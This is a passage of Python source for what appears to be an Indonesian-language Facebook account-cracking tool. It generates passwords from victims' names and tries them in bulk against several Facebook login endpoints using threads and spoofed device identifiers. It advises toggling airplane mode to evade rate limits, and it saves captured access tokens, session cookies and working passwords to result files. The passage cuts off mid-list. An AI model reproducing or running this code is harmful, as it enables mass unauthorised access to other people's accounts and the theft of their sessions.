                            self.password.append(f'{str(passwords).lower()}')
            for passwords in [f'{name}', f'{name.replace(" ", "")}']:
                if len(passwords) < 6 or str(passwords).replace(' ', '').isalnum() == False:
                    continue
                else:
                    self.password.append(f'{str(passwords).lower()}')
            return (self.password)

    def Cracking(self, setingan):
        global Dump, Sukses, Checkpoint
        try:
            if bool(setingan) == True:
                Console(width = 65, style = "bold dodger_blue3").print(Panel(f"""[bold green]01[bold white]. Gunakan Metode https://m.facebook.com ([bold green]Async[bold white] +[bold green] Regular[bold white])
[bold green]02[bold white]. Gunakan Metode https://web.facebook.com ([bold green]Regular[bold white])
[bold green]03[bold white]. Gunakan Metode https://mbasic.facebook.com ([bold red]Regular[bold white])
[bold green]04[bold white]. Gunakan Metode https://d.facebook.com ([bold red]Sign Up[bold white])
[bold green]05[bold white]. Gunakan Metode https://www.messenger.com ([bold green]Chat[bold white])
[bold green]06[bold white]. Gunakan Metode https://api.facebook.com ([bold red]Messenger Lite[bold white])
[bold green]07[bold white]. Gunakan Metode https://m.facebook.com ([bold red]Validate[bold white])
[bold green]08[bold white]. Gunakan Metode https://graph.facebook.com ([bold red]Facebook Apps[bold white])""", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Pilih Metode)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                metode = Console().input("[bold dodger_blue3]   ╰─> ")
                if metode == '1' or metode == '01':
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"""[bold green]01[bold white]. Gunakan Encryption Password ([bold red]Not Recommended[bold white])
[bold green]02[bold white]. Gunakan Password Tanpa Encryption ([bold green]Recommended[bold white])""", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Encryption Password)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                    enc_pass = Console().input("[bold dodger_blue3]   ╰─> ")
                    if enc_pass == '01' or enc_pass == '1':
                        self.encrypt_password = (True)
                    else:
                        self.encrypt_password = (False)
                    Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Hidupkan[italic red] Mode Pesawat[italic white] Setiap 200 Username Dan Jika Muncul Tulisan[italic blue] AttributeError[italic white], Hasil[italic green] Success[italic white] Atau[italic red] Checkpoint[italic white] Tergan\ntung Dari[italic yellow] Useragent[italic white] Kamu Dan[italic yellow] Target[italic white] Yang Kamu Masukan.", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<"))
                    with ThreadPoolExecutor(max_workers=35) as s:
                        for z in Dump:
                            self.username, self.name = z.split('|')[0], z.split('|')[1]
                            self.password = self.Generate_Password(self.name)
                            s.submit(self.Mobile_Prod, Dump, self.username, self.password, self.encrypt_password)
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Selamat Kamu Mendapatkan[italic yellow] {len(Sukses)}[italic white] Hasil[italic green] Success[italic white] Dan[italic yellow] {len(Checkpoint)}[italic white] Hasil[italic red] Checkpoint[italic white] Dari {str(len(Dump))} Username, Semua Hasil Sudah Di Simpan!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Selesai)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
                elif metode == '2' or metode == '02':
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"""[bold green]01[bold white]. Gunakan Encryption Password ([bold red]Not Recommended[bold white])
[bold green]02[bold white]. Gunakan Password Tanpa Encryption ([bold green]Recommended[bold white])""", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Encryption Password)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                    enc_pass = Console().input("[bold dodger_blue3]   ╰─> ")
                    if enc_pass == '01' or enc_pass == '1':
                        self.encrypt_password = (True)
                    else:
                        self.encrypt_password = (False)
                    Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Hidupkan[italic red] Mode Pesawat[italic white] Setiap 200 Username Dan Jika Muncul Tulisan[italic blue] AttributeError[italic white], Hasil[italic green] Success[italic white] Atau[italic red] Checkpoint[italic white] Tergan\ntung Dari[italic yellow] Useragent[italic white] Kamu Dan[italic yellow] Target[italic white] Yang Kamu Masukan.", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<"))
                    with ThreadPoolExecutor(max_workers=35) as s:
                        for z in Dump:
                            self.username, self.name = z.split('|')[0], z.split('|')[1]
                            self.password = self.Generate_Password(self.name)
                            s.submit(self.Web_Regular, Dump, self.username, self.password, self.encrypt_password)
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Selamat Kamu Mendapatkan[italic yellow] {len(Sukses)}[italic white] Hasil[italic green] Success[italic white] Dan[italic yellow] {len(Checkpoint)}[italic white] Hasil[italic red] Checkpoint[italic white] Dari {str(len(Dump))} Username, Semua Hasil Sudah Di Simpan!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Selesai)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
                elif metode == '3' or metode == '03':
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"""[bold green]01[bold white]. Gunakan Useragent Facebook Lite ([bold green]Recommended[bold white])
[bold green]02[bold white]. Gunakan Useragent Chrome Browser ([bold red]Not Recommended[bold white])""", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Type Useragent)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                    type_useragent = Console().input("[bold dodger_blue3]   ╰─> ")
                    if type_useragent == '01' or type_useragent == '1':
                        self.type_useragent = ("Lite")
                    else:
                        self.type_useragent = ("Browser")
                    Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Hidupkan[italic red] Mode Pesawat[italic white] Setiap 200 Username Dan Jika Muncul Tulisan[italic blue] AttributeError[italic white], Hasil[italic green] Success[italic white] Atau[italic red] Checkpoint[italic white] Tergan\ntung Dari[italic yellow] Useragent[italic white] Kamu Dan[italic yellow] Target[italic white] Yang Kamu Masukan.", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<"))
                    with ThreadPoolExecutor(max_workers=35) as s:
                        for z in Dump:
                            self.username, self.name = z.split('|')[0], z.split('|')[1]
                            self.password = self.Generate_Password(self.name)
                            s.submit(self.Mbasic, Dump, self.username, self.password, self.type_useragent)
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Selamat Kamu Mendapatkan[italic yellow] {len(Sukses)}[italic white] Hasil[italic green] Success[italic white] Dan[italic yellow] {len(Checkpoint)}[italic white] Hasil[italic red] Checkpoint[italic white] Dari {str(len(Dump))} Username, Semua Hasil Sudah Di Simpan!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Selesai)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
                elif metode == '4' or metode == '04':
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"""[bold green]01[bold white]. Gunakan Useragent Facebook Lite ([bold green]Recommended[bold white])
[bold green]02[bold white]. Gunakan Useragent Chrome Browser ([bold red]Not Recommended[bold white])""", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Type Useragent)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                    type_useragent = Console().input("[bold dodger_blue3]   ╰─> ")
                    if type_useragent == '01' or type_useragent == '1':
                        self.type_useragent = ("Lite")
                    else:
                        self.type_useragent = ("Browser")
                    Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Hidupkan[italic red] Mode Pesawat[italic white] Setiap 200 Username Dan Jika Muncul Tulisan[italic blue] AttributeError[italic white], Hasil[italic green] Success[italic white] Atau[italic red] Checkpoint[italic white] Tergan\ntung Dari[italic yellow] Useragent[italic white] Kamu Dan[italic yellow] Target[italic white] Yang Kamu Masukan.", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<"))
                    with ThreadPoolExecutor(max_workers=35) as s:
                        for z in Dump:
                            self.username, self.name = z.split('|')[0], z.split('|')[1]
                            self.password = self.Generate_Password(self.name)
                            s.submit(self.Default, Dump, self.username, self.password, self.type_useragent)
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Selamat Kamu Mendapatkan[italic yellow] {len(Sukses)}[italic white] Hasil[italic green] Success[italic white] Dan[italic yellow] {len(Checkpoint)}[italic white] Hasil[italic red] Checkpoint[italic white] Dari {str(len(Dump))} Username, Semua Hasil Sudah Di Simpan!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Selesai)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
                elif metode == '6' or metode == '06':
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Silahkan Masukan Provider Yang Kamu Gunakan Dari ([italic red]Indosat, TRI, XL AXIATA, Telkomsel[italic white]) Jika Tidak Ada Di Dalam List Kamu Bisa Mengisi Manual, Misalnya :[italic green] AXIS", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Your Provider)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                    your_provider = Console().input("[bold dodger_blue3]   ╰─> ")
                    Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Hidupkan[italic red] Mode Pesawat[italic white] Setiap 100 Username Dan Jika Muncul Tulisan[italic blue] AttributeError[italic white], Hasil[italic green] Success[italic white] Atau[italic red] Checkpoint[italic white] Tergan\ntung Dari[italic yellow] Useragent[italic white] Kamu Dan[italic yellow] Target[italic white] Yang Kamu Masukan.", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<"))
                    with ThreadPoolExecutor(max_workers=35) as s:
                        for z in Dump:
                            self.username, self.name = z.split('|')[0], z.split('|')[1]
                            self.password = self.Generate_Password(self.name)
                            s.submit(self.Messenger_Lite, Dump, self.username, self.password, your_provider)
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Selamat Kamu Mendapatkan[italic yellow] {len(Sukses)}[italic white] Hasil[italic green] Success[italic white] Dan[italic yellow] {len(Checkpoint)}[italic white] Hasil[italic red] Checkpoint[italic white] Dari {str(len(Dump))} Username, Semua Hasil Sudah Di Simpan!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Selesai)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
                elif metode == '7' or metode == '07':
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"""[bold green]01[bold white]. Gunakan Encryption Password ([bold red]Not Recommended[bold white])
[bold green]02[bold white]. Gunakan Password Tanpa Encryption ([bold green]Recommended[bold white])""", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Encryption Password)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                    enc_pass = Console().input("[bold dodger_blue3]   ╰─> ")
                    if enc_pass == '01' or enc_pass == '1':
                        self.encrypt_password = (True)
                    else:
                        self.encrypt_password = (False)
                    Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Hidupkan[italic red] Mode Pesawat[italic white] Setiap 200 Username Dan Jika Muncul Tulisan[italic blue] AttributeError[italic white], Hasil[italic green] Success[italic white] Atau[italic red] Checkpoint[italic white] Tergan\ntung Dari[italic yellow] Useragent[italic white] Kamu Dan[italic yellow] Target[italic white] Yang Kamu Masukan.", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<"))
                    with ThreadPoolExecutor(max_workers=35) as s:
                        for z in Dump:
                            self.username, self.name = z.split('|')[0], z.split('|')[1]
                            self.password = self.Generate_Password(self.name)
                            s.submit(self.Mobile, Dump, self.username, self.password, self.encrypt_password)
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Selamat Kamu Mendapatkan[italic yellow] {len(Sukses)}[italic white] Hasil[italic green] Success[italic white] Dan[italic yellow] {len(Checkpoint)}[italic white] Hasil[italic red] Checkpoint[italic white] Dari {str(len(Dump))} Username, Semua Hasil Sudah Di Simpan!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Selesai)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
                elif metode == '8' or metode == '08':
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Silahkan Masukan Provider Yang Kamu Gunakan Dari ([italic red]Indosat, TRI, XL AXIATA, Telkomsel[italic white]) Jika Tidak Ada Di Dalam List Kamu Bisa Mengisi Manual, Misalnya :[italic green] AXIS", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Your Provider)[bold green] <[bold yellow]<[bold red]<", subtitle = "╭────", subtitle_align = "left"))
                    your_provider = Console().input("[bold dodger_blue3]   ╰─> ")
                    Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Hidupkan[italic red] Mode Pesawat[italic white] Setiap 100 Username Dan Jika Muncul Tulisan[italic blue] AttributeError[italic white], Hasil[italic green] Success[italic white] Atau[italic red] Checkpoint[italic white] Tergan\ntung Dari[italic yellow] Useragent[italic white] Kamu Dan[italic yellow] Target[italic white] Yang Kamu Masukan.", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<"))
                    with ThreadPoolExecutor(max_workers=35) as s:
                        for z in Dump:
                            self.username, self.name = z.split('|')[0], z.split('|')[1]
                            self.password = self.Generate_Password(self.name)
                            s.submit(self.Facebook_Apps, Dump, self.username, self.password, your_provider)
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Selamat Kamu Mendapatkan[italic yellow] {len(Sukses)}[italic white] Hasil[italic green] Success[italic white] Dan[italic yellow] {len(Checkpoint)}[italic white] Hasil[italic red] Checkpoint[italic white] Dari {str(len(Dump))} Username, Semua Hasil Sudah Di Simpan!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Selesai)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
                else:
                    Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Hidupkan[italic red] Mode Pesawat[italic white] Setiap 200 Username Dan Jika Muncul Tulisan[italic blue] AttributeError[italic white], Hasil[italic green] Success[italic white] Atau[italic red] Checkpoint[italic white] Tergan\ntung Dari[italic yellow] Useragent[italic white] Kamu Dan[italic yellow] Target[italic white] Yang Kamu Masukan.", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<"))
                    with ThreadPoolExecutor(max_workers=35) as s:
                        for z in Dump:
                            self.username, self.name = z.split('|')[0], z.split('|')[1]
                            self.password = self.Generate_Password(self.name)
                            s.submit(self.Messenger, Dump, self.username, self.password)
                    Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Selamat Kamu Mendapatkan[italic yellow] {len(Sukses)}[italic white] Hasil[italic green] Success[italic white] Dan[italic yellow] {len(Checkpoint)}[italic white] Hasil[italic red] Checkpoint[italic white] Dari {str(len(Dump))} Username, Semua Hasil Sudah Di Simpan!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Selesai)[bold green] <[bold yellow]<[bold red]<"))
                    exit()
            else:
                Console(width = 65, style = "bold dodger_blue3").print(Panel("[italic white]Hidupkan[italic red] Mode Pesawat[italic white] Setiap 200 Username Dan Jika Muncul Tulisan[italic blue] AttributeError[italic white], Hasil[italic green] Success[italic white] Atau[italic red] Checkpoint[italic white] Tergan\ntung Dari[italic yellow] Useragent[italic white] Kamu Dan[italic yellow] Target[italic white] Yang Kamu Masukan.", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Catatan)[bold green] <[bold yellow]<[bold red]<"))
                with ThreadPoolExecutor(max_workers=35) as s:
                    for z in Dump:
                        self.username, self.name = z.split('|')[0], z.split('|')[1]
                        self.password = self.Generate_Password(self.name)
                        s.submit(self.Web_Regular, Dump, self.username, self.password, encrypt_password=False)
                Console(width = 65, style = "bold dodger_blue3").print(Panel(f"[italic white]Selamat Kamu Mendapatkan[italic yellow] {len(Sukses)}[italic white] Hasil[italic green] Success[italic white] Dan[italic yellow] {len(Checkpoint)}[italic white] Hasil[italic red] Checkpoint[italic white] Dari {str(len(Dump))} Username, Semua Hasil Sudah Di Simpan!", title = "[bold red]>[bold yellow]>[bold green]> [bold dodger_blue3](Selesai)[bold green] <[bold yellow]<[bold red]<"))
                exit()
        except (Exception) as e:
            exit()

    def Facebook_Apps(self, total, username, password, your_provider):
        global Sukses, Checkpoint, Looping
        try:
            for pws in password:
                if len(pws) < 6:
                    continue
                else:
                    self.useragent, self.persen = (str(Generate().Facebook_Apps_Useragent()).replace('INDOSAT', your_provider)), (Looping * 100 / len(total))
                    with requests.Session() as r:
                        self.x_fb_hni = (str(random.randint(30000, 40000)))
                        self.x_fb_ta_logging_ids = str(uuid.uuid4())
                        self.device_id = str(uuid.uuid4())
                        self.family_device_id = str(uuid.uuid4())
                        r.headers.update({
                            'content-type': 'application/x-www-form-urlencoded',
                            'analytics-tags': '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
                            'connection': 'keep-alive',
                            'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
                            'x-tigon-is-retry': 'False',
                            'x-fb-ta-logging-ids': 'graphql:{}'.format(self.x_fb_ta_logging_ids),
                            'x-fb-net-hni': '{}'.format(self.x_fb_hni),
                            'x-fb-server-cluster': 'True',
                            'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                            'accept-encoding': 'gzip, deflate',
                            'x-fb-connection-type': 'MOBILE.LTE',
                            'x-fb-client-ip': 'True',
                            'x-graphql-client-library': 'graphservice',
                            'x-fb-device-group': '{}'.format(str(random.randint(1000, 4000))),
                            'Host': 'b-graph.facebook.com',
                            'x-graphql-request-purpose': 'fetch',
                            'x-fb-http-engine': 'Liger',
                            'x-fb-sim-hni': '{}'.format(self.x_fb_hni),
                            'x-fb-privacy-context': '3643298472347298',
                            'user-agent': self.useragent,
                        })
                        data = (f'method=post&pretty=false&format=json&server_timestamps=true&locale=id_ID&purpose=fetch&fb_api_req_friendly_name=FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request&fb_api_caller_class=graphservice&client_doc_id=11994080429476855663503865341&variables=%7B%22params%22%3A%7B%22params%22%3A%22%7B%5C%22params%5C%22%3A%5C%22%7B%5C%5C%5C%22client_input_params%5C%5C%5C%22%3A%7B%5C%5C%5C%22device_id%5C%5C%5C%22%3A%5C%5C%5C%22{urllib.request.quote(self.device_id)}%5C%5C%5C%22%2C%5C%5C%5C%22sim_phones%5C%5C%5C%22%3A%5B%5D%2C%5C%5C%5C%22login_attempt_count%5C%5C%5C%22%3A1%2C%5C%5C%5C%22secure_family_device_id%5C%5C%5C%22%3A%5C%5C%5C%22{urllib.request.quote(str(uuid.uuid4()))}%5C%5C%5C%22%2C%5C%5C%5C%22machine_id%5C%5C%5C%22%3A%5C%5C%5C%22Zz3wZEUXl5QTtZtfca2kXYVU%5C%5C%5C%22%2C%5C%5C%5C%22accounts_list%5C%5C%5C%22%3A%5B%5D%2C%5C%5C%5C%22auth_secure_device_id%5C%5C%5C%22%3A%5C%5C%5C%22%5C%5C%5C%22%2C%5C%5C%5C%22password%5C%5C%5C%22%3A%5C%5C%5C%22%23PWD_FB4A%3A0%3A{str(int(time.time()))}%3A{urllib.request.quote(str(pws))}%5C%5C%5C%22%2C%5C%5C%5C%22family_device_id%5C%5C%5C%22%3A%5C%5C%5C%22{urllib.request.quote(str(self.family_device_id))}%5C%5C%5C%22%2C%5C%5C%5C%22fb_ig_device_id%5C%5C%5C%22%3A%5B%5D%2C%5C%5C%5C%22device_emails%5C%5C%5C%22%3A%5B%5D%2C%5C%5C%5C%22try_num%5C%5C%5C%22%3A1%2C%5C%5C%5C%22event_flow%5C%5C%5C%22%3A%5C%5C%5C%22login_manual%5C%5C%5C%22%2C%5C%5C%5C%22event_step%5C%5C%5C%22%3A%5C%5C%5C%22home_page%5C%5C%5C%22%2C%5C%5C%5C%22sim_serials%5C%5C%5C%22%3A%5B%5D%2C%5C%5C%5C%22openid_tokens%5C%5C%5C%22%3A%7B%7D%2C%5C%5C%5C%22client_known_key_hash%5C%5C%5C%22%3A%5C%5C%5C%22%5C%5C%5C%22%2C%5C%5C%5C%22contact_point%5C%5C%5C%22%3A%5C%5C%5C%22{urllib.request.quote(str(username))}%5C%5C%5C%22%2C%5C%5C%5C%22encrypted_msisdn%5C%5C%5C%22%3A%5C%5C%5C%22%5C%5C%5C%22%7D%2C%5C%5C%5C%22server_params%5C%5C%5C%22%3A%7B%5C%5C%5C%22should_trigger_override_login_2fa_action%5C%5C%5C%22%3A0%2C%5C%5C%5C%22username_text_input_id%5C%5C%5C%22%3A%5C%5C%5C%22uw4uv7%3A56%5C%5C%5C%22%2C%5C%5C%5C%22should_trigger_override_login_success_action%5C%5C%5C%22%3A0%2C%5C%5C%5C%22device_id%5C%5C%5C%22%3A%5C%5C%5C%22{urllib.request.quote(self.device_id)}%5C%5C%5C%22%2C%5C%5C%5C%22server_login_source%5C%5C%5C%22%3A%5C%5C%5C%22login%5C%5C%5C%22%2C%5C%5C%5C%22waterfall_id%5C%5C%5C%22%3A%5C%5C%5C%22{urllib.request.quote(str(uuid.uuid4()))}%5C%5C%5C%22%2C%5C%5C%5C%22login_source%5C%5C%5C%22%3A%5C%5C%5C%22Login%5C%5C%5C%22%2C%5C%5C%5C%22INTERNAL__latency_qpl_instance_id%5C%5C%5C%22%3A186795961900225%2C%5C%5C%5C%22reg_flow_source%5C%5C%5C%22%3A%5C%5C%5C%22login_home_native_integration_point%5C%5C%5C%22%2C%5C%5C%5C%22is_caa_perf_enabled%5C%5C%5C%22%3A1%2C%5C%5C%5C%22is_platform_login%5C%5C%5C%22%3A0%2C%5C%5C%5C%22credential_type%5C%5C%5C%22%3A%5C%5C%5C%22password%5C%5C%5C%22%2C%5C%5C%5C%22pw_encryption_try_count%5C%5C%5C%22%3A1%2C%5C%5C%5C%22caller%5C%5C%5C%22%3A%5C%5C%5C%22gslr%5C%5C%5C%22%2C%5C%5C%5C%22INTERNAL__latency_qpl_marker_id%5C%5C%5C%22%3A36707139%2C%5C%5C%5C%22family_device_id%5C%5C%5C%22%3A%5C%5C%5C%22{urllib.request.quote(str(self.family_device_id))}%5C%5C%5C%22%2C%5C%5C%5C%22offline_experiment_group%5C%5C%5C%22%3A%5C%5C%5C%22caa_iteration_v6_perf_fb_2%5C%5C%5C%22%2C%5C%5C%5C%22INTERNAL_INFRA_THEME%5C%5C%5C%22%3A%5C%5C%5C%22harm_f%5C%5C%5C%22%2C%5C%5C%5C%22password_text_input_id%5C%5C%5C%22%3A%5C%5C%5C%22uw4uv7%3A57%5C%5C%5C%22%2C%5C%5C%5C%22ar_event_source%5C%5C%5C%22%3A%5C%5C%5C%22login_home_page%5C%5C%5C%22%7D%7D%5C%22%7D%22%2C%22bloks_versioning_id%22%3A%22b40360fc842962f2f20ae862b9e33d66b5e55ab09792c32e443420306f864be6%22%2C%22app_id%22%3A%22com.bloks.www.bloks.caa.login.async.send_login_request%22%7D%2C%22scale%22%3A%222%22%2C%22nt_context%22%3A%7B%22using_white_navbar%22%3Atrue%2C%22pixel_ratio%22%3A2%2C%22is_push_on%22%3Atrue%2C%22styles_id%22%3A%22b5bbf1cf43ecf97d36d17b628ba4fc34%22%2C%22bloks_version%22%3A%22b40360fc842962f2f20ae862b9e33d66b5e55ab09792c32e443420306f864be6%22%7D%7D&fb_api_analytics_tags=%5B%22GraphServices%22%5D&client_trace_id={urllib.request.quote(self.x_fb_ta_logging_ids)}')
                        response = r.post('https://b-graph.facebook.com/graphql', data = data, allow_redirects = True)
                        #open('Response.txt', 'a+').write(f'{username}|{pws}|{self.useragent}|'+str(response.text.replace('\\', ''))+'\n')
                        if '"access_token":"EAAAAU' in str(response.text.replace('\\', '')) or '"session_key":"' in str(response.text.replace('\\', '')):
                            try:
                                self.access_token = re.search('"access_token":"(.*?)",', str(response.text.replace('\\', ''))).group(1)
                                self.c_user = re.search('"c_user","value":"(\d+)",', str(response.text.replace('\\', ''))).group(1)
                                self.fr = re.search('"name":"fr","value":"(.*?)",', str(response.text.replace('\\', ''))).group(1)
                                self.datr = re.search('"name":"datr","value":"(.*?)",', str(response.text.replace('\\', ''))).group(1)
                                self.xs = re.search('"name":"xs","value":"(.*?)",', str(response.text.replace('\\', ''))).group(1)
                                self.cookies = (f"datr={self.datr}; fr={self.fr}; c_user={self.c_user}; xs={self.xs}")
                            except:
                                break
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold green]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold green]{pws}", style = "bold dodger_blue3", width = 30)]))
                            tree.add(Panel(f"[bold green]{self.access_token}", style = "bold dodger_blue3", width = 61))
                            tree.add(Panel(f"[bold green]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Sukses.append(f'{username}|{pws}|{self.cookies}|{self.useragent}')
                            with open(f'Results/Ok-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{pws}|{self.cookies}|{self.useragent}\n')
                            w.close()
                            break
                        elif 'https://www.facebook.com/checkpoint/start/' in str(response.text.replace('\\', '')) or 'https://www.facebook.com/checkpoint/' in str(response.text.replace('\\', '')):
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold red]{pws}", style = "bold dodger_blue3", width = 30)]))
                            tree.add(Panel(f"[bold red]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Checkpoint.append(f'{username}|{pws}|{self.useragent}')
                            with open(f'Results/Cp-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{pws}|{self.useragent}\n')
                            w.close()
                            break
                        elif 'two_step_verification' in str(response.text.replace('\\', '')) or '"login_challenges"' in str(response.text.replace('\\', '')) or '"https://whatsapp://"' in str(response.text.replace('\\', '')):
                            print("\r                                                        ", end='\r')
                            time.sleep(1.0)
                            tree = Tree(Panel.fit("[bold red]TWO FACTOR AUTHENTICATION", style = "bold dodger_blue3"), style = "bold white")
                            tree.add(Columns([Panel(f"[bold red]{username}", style = "bold dodger_blue3", width = 30), Panel(f"[bold red]{pws}", style = "bold dodger_blue3", width = 30)]))
                            tree.add(Panel(f"[bold red]{self.useragent}", style = "bold dodger_blue3", width = 61))
                            print(tree)
                            time.sleep(3.0)
                            Checkpoint.append(f'{username}|{pws}|{self.useragent}')
                            with open(f'Results/Cp-{Convert().Tanggal()}.txt', 'a+') as w:
                                w.write(f'{username}|{pws}|{self.useragent}\n')
                            w.close()
                            break
                        else:
                            continue
            Looping += 1
            print(f"[bold dodger_blue3]   ───>[bold white] Crack[bold green] {str(username)[:15]}[bold white]/[bold blue]{Looping}[bold white]/[bold blue]{str(len(total))}[bold white]/[bold blue]{str(self.persen)[:4]}%[bold white] Cp:-[bold red]{len(Checkpoint)}[bold white] Ok:-[bold green]{len(Sukses)}     ", end='\r')
            time.sleep(0.0007)
        except (RequestException) as e:
            print("\r                                                        ", end='\r')
            print("[bold dodger_blue3]   ───>[bold red] KONEKSI ERROR!", end='\r')
            time.sleep(10.5)
            self.Facebook_Apps(total, username, password, your_provider)
        except (Exception) as e:
            print("\r                                                        ", end='\r')
            print(f"[bold dodger_blue3]   ───>[bold red] {str(e).upper()}!", end='\r')

    def Mbasic(self, total, username, password, type_useragent):
        global Sukses, Checkpoint, Looping
        try:
            for pws in password:
                if len(pws) < 6:
                    continue
                else:
                    if str(type_useragent).capitalize() == "Lite":
                        self.useragent_android, self.persen = (Generate().Android_Useragent()), (Looping * 100 / len(total))
                        self.app_version = random.choice(['369.0.0.5.110', '371.0.0.0.78', '371.0.0.0.33', '370.0.0.12.116', '370.0.0.0.39', '369.0.0.2.110', '369.0.0.0.84', '369.0.0.0.21', '369.0.0.0.4', '368.0.0.5.95', '368.0.0.4.95', '368.0.0.2.95', '368.0.0.0.84', '368.0.0.0.69', '368.0.0.0.15', '368.0.0.0.3', '367.0.0.7.52', '367.0.0.6.52', '367.0.0.5.52', '367.0.0.0.44', '367.0.0.0.14', '367.0.0.0.3', '366.0.0.10.51', '366.0.0.6.51', '366.0.0.3.51', '366.0.0.0.3', '365.0.0.9.53', '365.0.0.8.53', '365.0.0.4.53', '365.0.0.0.44', '364.0.0.14.77', '364.0.0.11.77', '365.0.0.0.13', '364.0.0.9.77', '365.0.0.0.4', '364.0.0.0.58', '363.0.0.6.63', '363.0.0.5.63', '363.0.0.4.63', '364.0.0.0.16', '364.0.0.0.3', '363.0.0.2.63', '363.0.0.0.60', '363.0.0.0.49', '362.0.0.10.67', '362.0.0.7.67', '363.0.0.0.14', '362.0.0.6.67', '362.0.0.3.67', '363.0.0.0.3', '362.0.0.0.62', '362.0.0.0.49', '361.0.0.12.5', '361.0.0.11.5', '361.0.0.10.5', '361.0.0.9.5', '362.0.0.0.11', '361.0.0.8.5', '361.0.0.6.5', '362.0.0.0.3', '362.0.0.0.46', '362.0.0.0.39', '360.0.0.7.53', 